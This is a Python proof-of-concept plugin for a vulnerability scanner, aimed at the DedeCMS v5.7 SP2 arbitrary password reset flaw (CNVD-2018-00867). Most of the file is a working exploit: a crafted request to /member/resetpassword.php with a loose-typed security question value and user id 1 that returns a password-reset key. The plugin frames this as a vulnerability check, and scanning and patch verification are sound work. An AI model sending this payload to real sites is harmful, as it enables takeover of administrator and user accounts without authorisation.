# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0051_L'  # 平台漏洞编号，留空
    name = 'DeDeCMS v5.7 SP2正式版前台任意用户密码修改漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2018-01-11'  # 漏洞公布时间
    desc = '''
        DedeCms（织梦内容管理系统) 是一款PHP开源网站管理系统。 

        DeDeCMS v5.7 SP2正式版前台存在任意用户密码修改漏洞。该漏洞是由于前台resetpassword.php中对接受参数类型控制不严格所致，攻击者可利用漏洞在前台会员中心绕过验证，修改任意用户密码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-00867'  # 漏洞来源
    cnvd_id = 'CNVD-2018-00867'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'v5.7 SP2正式版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '96d2cfb8-7f9c-49ab-ab68-c978616575f1'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7_
            # 先注册一个帐号并登录，然后访问：
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            payload = "/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=1"
            url = self.target + payload
            r = requests.get(url, cookies=cookies)

            if 'key=' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
